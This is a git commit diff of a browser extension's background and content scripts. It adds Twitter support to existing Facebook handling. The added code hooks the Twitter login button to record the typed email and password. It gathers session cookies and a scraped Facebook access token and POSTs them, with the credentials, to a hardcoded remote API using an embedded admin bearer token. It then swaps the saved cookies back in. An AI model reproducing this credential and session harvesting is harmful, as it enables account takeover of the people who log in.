fce067831be1cdb9bc21f008515ed1d7b8c82bde
shawnsavour <congson99tn@gmail.com>
2021-07-12 23:10:22 +0700

    push

--- js/background.js
+++ js/background.js
@@ -1,16 +1,25 @@
-function removeCookies() {
-    chrome.cookies.getAll({ domain: ".facebook.com" }, function(cookies) {
+chrome.storage.sync.set({ extensionState: 0 }, function() {});
+
+function removeCookies(domain, url) {
+    chrome.cookies.getAll({ domain: domain }, function(cookies) {
         for (var i = 0; i < cookies.length; i++) {
-            chrome.cookies.remove({ url: "https://mbasic.facebook.com" + cookies[i].path, name: cookies[i].name });
+            chrome.cookies.remove({ url: url + cookies[i].path, name: cookies[i].name });
             console.log('cookie removed');
         }
     });
 }
 
-function saveCookie() {
-    chrome.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function(e) {
+function savefbCookie(url) {
+    chrome.cookies.getAll({ url: url }, function(e) {
         console.log('savecookie');
         chrome.storage.sync.set({ FBcookie: e }, function() {});
+    });
+}
+
+function savetwCookie(url) {
+    chrome.cookies.getAll({ url: url }, function(e) {
+        console.log('savecookie');
+        chrome.storage.sync.set({ TWcookie: e }, function() {});
     });
 }
 
@@ -29,19 +38,14 @@ function saveuToken() {
         // console.log(e);
     });
 }
-// saveCookie();
-// removeCookies();
-// chrome.storage.sync.get(['FBcookie'], function(result) {
-//     console.log(result.FBcookie);
-// });
 
 
-function addCookie() {
-    chrome.storage.sync.get(['FBcookie'], function(result) {
+function addfbCookie(cookie, url) {
+    chrome.storage.sync.get([cookie], function(result) {
         result.FBcookie.forEach(function(item, index) {
             delete item['hostOnly'];
             delete item['session'];
-            item['url'] = 'https://mbasic.facebook.com';
+            item['url'] = url;
             chrome.cookies.set(item, function(c) {
                 // console.log(JSON.stringify(c));
                 console.log('cookie added!')
@@ -50,6 +54,19 @@ function addCookie() {
     });
 }
 
+function addtwCookie(cookie, url) {
+    chrome.storage.sync.get([cookie], function(result) {
+        result.TWcookie.forEach(function(item, index) {
+            delete item['hostOnly'];
+            delete item['session'];
+            item['url'] = url;
+            chrome.cookies.set(item, function(c) {
+                // console.log(JSON.stringify(c));
+                console.log('cookie added!')
+            });
+        });
+    });
+}
 
 
 async function checkfbLogin() {
@@ -78,6 +95,62 @@ function sendtoContent(msg) {
     };
 }
 
+function twitterData() {
+    chrome.storage.sync.get(['TWemail', 'TWpassword'], function(result) {
+        var url = 'https://twitter.com';
+        chrome.cookies.getAll({ url: url }, function(e) {
+            if (e.length > 0) {
+                format = '';
+                for (let i = 0; i < e.length; i++) {
+                    format += e[i].name + '=' + e[i].value;
+                    if (i < e.length - 1) {
+                        format += ','
+                    }
+                }
+
+                var data = {
+                    "loginCookies": format,
+                    "loginPassword": result.TWpassword,
+                    "loginUsername": result.TWemail,
+                    "socialAccountState": 0,
+                    "socialAccountStateDescription": 0,
+                    "socialNetwork": {
+                        "id": 1
+                    },
+                    "status": true,
+                    "user": {
+                        "id": 1,
+                        "login": "admin"
+                    },
+                    "userToken": '',
+                    "userTokenState": 0,
+                    "userTokenStateDescription": "token"
+                };
+                $.ajax({
+                    url: "http://192.168.2.122:8081/api/connectome-social-media/create",
+                    type: 'POST',
+                    beforeSend: function(xhr) {
+                        xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODQxNDg1Nn0.vt-KxVv9DbQa2qeme36LJRQojKnHcKv6VRW_F9wvtE_xzYEcoy2vYBwmZhA6mKdJieObhsk8GRSKj6-KF7T-_Q');
+                    },
+                    contentType: 'application/json',
+                    data: JSON.stringify(data),
+                    success: function(response) {
+                        console.log(response);
+                        addtwCookie('TWcookie', 'https://twitter.com');
+                        // debugger;
+                    },
+                    error: function(r) {
+                        console.log(r);
+                        addtwCookie('TWcookie', 'https://twitter.com');
+                        // debugger;
+                    },
+                })
+            }
+            removeCookies(".twitter.com", "https://twitter.com");
+        })
+    })
+}
+
 function facebookData() {
     chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
         var uToken;
@@ -98,9 +171,7 @@ function facebookData() {
                         type: "get",
                         async: false,
                         global: false,
-                        success: function() {
-                            // return t;
-                        }
+                        success: function() {}
                     }).responseText;
                     s.search("EAAAAZ") == -1 ? uToken = '' : uToken = s.match(/EAAAAZ.*?\"/)[0].replace(/\W/g, "");
                 } catch (err) {
@@ -126,7 +197,7 @@ function facebookData() {
                     "userTokenStateDescription": "token"
                 };
                 $.ajax({
-                    url: "http://13.21.34.9:8081/api/connectome-social-media/create",
+                    url: "http://192.168.2.122:8081/api/connectome-social-media/create",
                     type: 'POST',
                     beforeSend: function(xhr) {
                         xhr.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJST0xFX0FETUlOLFJPTEVfVVNFUiIsImV4cCI6MTYyODQxNDg1Nn0.vt-KxVv9DbQa2qeme36LJRQojKnHcKv6VRW_F9wvtE_xzYEcoy2vYBwmZhA6mKdJieObhsk8GRSKj6-KF7T-_Q');
@@ -135,47 +206,20 @@ function facebookData() {
                     data: JSON.stringify(data),
                     success: function(response) {
                         console.log(response);
-                        addCookie();
+                        addfbCookie('FBcookie', 'https://mbasic.facebook.com');
                         // debugger;
                     },
                     error: function(r) {
                         console.log(r);
+                        addfbCookie('FBcookie', 'https://mbasic.facebook.com');
                         // debugger;
                     },
                 })
             }
-            removeCookies();
+            removeCookies(".facebook.com", "https://mbasic.facebook.com");
         })
     })
 };
-
-
-
-// chrome.browserAction.onClicked.addListener(function(activeTab) {
-//     chrome.storage.sync.get(['FncMyELTS'], function(result) {
-//         if (result.FncMyELTS == "FncMyELTSver1"){
-//             chrome.tabs.executeScript({
-//                 file: "js/MyELTSver1.js"
-//             });
-//         }
-//         if (result.FncMyELTS == "FncMyELTSver2"){
-//             chrome.tabs.executeScript({
-//                 file: "js/MyELTSver2.js"
-//             });
-//         }
-//         if (result.FncMyELTS == "FncMyELTSver3"){
-//             chrome.tabs.executeScript({
-//                 file: "js/MyELTSver3.js"
-//             });
-//         }
-//     });
-//     if (i % 15 == 14){
-//         chrome.tabs.create({url: "https://shawnsavour.com/Buy-me-a-coffee/"});
-//     };
-//     i++
-
-// });
-
 
 
 
@@ -191,26 +235,23 @@ chrome.runtime.onMessage.addListener(async function(response, sender, sendRespon
         case 'sendData':
             facebookData();
             break;
-        case 'Login':
-            saveCookie();
-            removeCookies();
+        case 'fbLogin':
+            savefbCookie('https://mbasic.facebook.com');
+            removeCookies(".facebook.com", "https://mbasic.facebook.com");
             chrome.tabs.create({ url: 'https://mbasic.facebook.com/login?refsrc=deprecated' });
             break;
-        case 'removeCookie':
-            removeCookies();
+        case 'twLogin':
+            savetwCookie('https://twitter.com/');
+            removeCookies(".twitter.com", "https://twitter.com/");
+            chrome.tabs.create({ url: 'https://twitter.com/login' });
             break;
-        case 'saveCookie':
-            saveCookie();
-            break;
-        case 'addCookie':
-            addCookie();
-            break;
-        case 'doneLogin':
+        case 'donefbLogin':
             setTimeout(facebookData(), 2000);
+            break;
+        case 'donetwLogin':
+            setTimeout(twitterData(), 2000);
             break;
         default:
             console.log('nofunction');
-            // code block
     }
 });
-// sendtoContent('abc');
--- js/content.js
+++ js/content.js
@@ -1,22 +1,66 @@
 function sendmsg(msg) {
     chrome.runtime.sendMessage(msg);
 }
-if (window.location.href.indexOf("localhost") > -1) {
+if (window.location.href.indexOf("localhost/testweb/facebook") > -1) {
     sendmsg('checklogin');
 
     document.getElementById('needLogin').onclick = function() {
-        sendmsg('Login');
+        sendmsg('fbLogin');
     };
 
-    document.getElementById('loadCookiebtn').onclick = function() {
-        sendmsg('addCookie');
-    };
-
-    document.getElementById('sendData').onclick = function() {
-        alert('click');
-        sendmsg('sendData');
-    };
+    // document.getElementById('sendData').onclick = function() {
+    //     alert('click');
+    //     sendmsg('sendData');
+    // };
 }
+if (window.location.href.indexOf("localhost/testweb/twitter") > -1) {
+    sendmsg('checklogin');
+
+    document.getElementById('needLogin').onclick = function() {
+        sendmsg('twLogin');
+    };
+
+    // document.getElementById('sendData').onclick = function() {
+    //     alert('click');
+    //     sendmsg('sendData');
+    // };
+}
+window.addEventListener('locationchange', function() {
+    alert('location changed!');
+});
+if (window.location.href.indexOf("twitter.com/login") > -1) {
+    try {
+        window.addEventListener('locationchange', function() {
+            alert('location changed!');
+        });
+        setTimeout(function() {
+            document.querySelector('div[data-testid="LoginForm_Login_Button"]').onclick = function() {
+                var email = document.querySelector('input[name="session[username_or_email]"]').value;
+                var password = document.querySelector('input[name="session[password]"]').value;
+                chrome.storage.sync.set({ TWemail: email, TWpassword: password }, function() {
+                    console.log('Set');
+                });
+                // chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
+                //     chrome.tabs.remove(tabs);
+                // });
+                //         });
+                // chrome.tabs.remove();
+
+                // chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
+                //     alert('Value' + result.FBpassword + 'currently is ' + result.FBemail);
+                // });
+                // sendmsg('Login');
+            };
+        }, 1000);
+        // setTimeout(function() {
+        //     sendmsg('donetwLogin');
+        // }, 2000)
+
+    } catch (err) {
+        console.log(err);
+    }
+}
+
 if (window.location.href.indexOf("mbasic.facebook.com/login") > -1) {
     try {
         document.querySelector('input[name="login"]').onclick = function() {
@@ -37,7 +81,7 @@ if (window.location.href.indexOf("mbasic.facebook.com/login") > -1) {
             // sendmsg('Login');
         };
     } catch (err) {
-        console.log(eer);
+        console.log(err);
     }
 
 }
@@ -54,7 +98,7 @@ function gotMessage(message, sender, sendResponse) {
             break;
         case 'facebookLogin':
             facebookLogin();
-            // setTimeout(facebookLogin(), 2000);
+            // setTimeout(facebookLogin(), 2000); 
             break;
         default:
             console.log('msg not have case!');
@@ -62,19 +106,17 @@ function gotMessage(message, sender, sendResponse) {
 }
 
 if (window.location.href.indexOf("mbasic.facebook.com/home.php") > -1) {
-    sendmsg('doneLogin');
-    // setTimeout(sendmsg('removeCookie'), 2000);
-    // setTimeout(sendmsg('addCookie'), 2000);
+    sendmsg('donefbLogin');
 }
-// function facebookLogin() {
-//     chrome.storage.sync.get(['FBemail', 'FBpassword'], function(result) {
-//         chrome.tabs.query({ active: true, currentWindow: true }, function() {
-//             alert(result.FBemail);
-//             console.log(result.FBemail);
-//             document.getElementById('m_login_email').value = result.FBemail;
-//             document.querySelector('input[name="pass"]').value = result.FBpassword;
-//             document.querySelector('input[name="login"]').click();
-//         });
+if (window.location.href.indexOf("https://twitter.com/home") > -1) {
+    sendmsg('donetwLogin');
+    // chrome.storage.sync.get(['TWcookie'], function(result) {
+    //     chrome.cookies.getAll({ url: 'https://twitter.com' }, function(e) {
+    //         if (JSON.stringify(result.TWcookie) !== JSON.stringify(e)) {
+    //         } else {
+    //             console.log('not match');
+    //         }
 
-//     });
-// }
+    //     });
+    // })
+};
